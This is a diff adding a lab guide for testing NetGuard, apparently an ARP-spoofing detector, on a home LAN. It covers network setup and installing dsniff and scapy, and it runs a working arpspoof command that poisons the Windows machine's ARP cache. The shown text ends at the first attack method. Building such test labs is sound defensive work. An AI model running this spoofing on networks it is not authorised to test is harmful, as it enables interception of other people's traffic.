@@ -1,0 +1,48 @@
+ What You Need
+Windows PC  ──────────────── Linux PC / VM
+(NetGuard running)            (attacker)
+     │                              │
+     └──────── Same Wi-Fi/LAN ──────┘
+Both machines must be on the same network (same Wi-Fi router or LAN switch).
+
+📋 STEP 1 — Find Your Network Info (on Windows)
+Open CMD and run:
+cmdipconfig
+Note down:
+Your Windows IP     →  e.g.  192.168.1.10
+Your Router/Gateway →  e.g.  192.168.1.1
+Your Subnet Mask    →  e.g.  255.255.255.0
+
+🪟 STEP 2 — Start NetGuard on Windows
+cmdcd NetGuard_Updated
+python server.py
+Open browser → http://localhost:5000
+
+Select your Wi-Fi or Ethernet interface
+Click ▶ Start
+Keep it running and watching
+
+
+🐧 STEP 3 — Setup on Linux (Attacker Machine)
+Open terminal on Linux and install the tools:
+bash# Update packages
+sudo apt update
+
+# Install arpspoof tool
+sudo apt install dsniff -y
+
+# Also install scapy (for the Python method)
+sudo pip3 install scapy --break-system-packages
+Find your Linux network interface:
+baship addr show
+# Look for something like: eth0, wlan0, ens33, enp0s3
+Check you can see the Windows machine from Linux:
+bashping 192.168.1.10    # your Windows IP
+
+🔥 STEP 4 — Run the ARP Spoof Attack (Linux)
+Method A — Using arpspoof (simplest)
+bash# Syntax: sudo arpspoof -i <interface> -t <target_ip> <gateway_ip>
+# This tells Windows machine that YOU are the router
+
+sudo arpspoof -i wlan0 -t 192.168.1.10 192.168.1.1
+It will keep sending spoofed packets every second. Leave it running and watch NetGuard on Windows.
